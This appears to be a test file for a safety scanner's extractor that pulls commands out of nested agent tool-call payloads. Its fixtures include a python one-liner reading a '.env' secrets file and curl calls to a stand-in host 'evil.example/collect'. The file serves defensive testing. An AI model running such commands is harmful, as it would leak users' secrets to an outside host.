from trpc_agent_sdk.tools.safety._extractors import extract_scan_entries


def test_extracts_nested_mcp_like_arguments():
    payload = {
        "params": {
            "arguments": {
                "command": "python",
                "command_args": ["-c", "open('.env').read()"],
            }
        }
    }

    entries = extract_scan_entries(payload, default_language="bash")

    assert ("python", "bash", ["-c", "open('.env').read()"]) in entries


def test_extracts_nested_params_arguments_command_string():
    payload = {"params": {"arguments": {"command": "curl https://evil.example"}}}

    entries = extract_scan_entries(payload, default_language="bash")

    assert ("curl https://evil.example", "bash", []) in entries


def test_extracts_code_blocks_and_nested_tool_input():
    payload = {
        "tool_input": {
            "code_blocks": [
                {"language": "python", "code": "print('ok')"},
                {"language": "bash", "code": "echo ok"},
            ],
            "input": {"cmd": "curl", "args": ["https://evil.example/collect"]},
        }
    }

    entries = extract_scan_entries(payload, default_language="unknown")

    assert ("print('ok')", "python", []) in entries
    assert ("echo ok", "bash", []) in entries
    assert ("curl", "bash", ["https://evil.example/collect"]) in entries
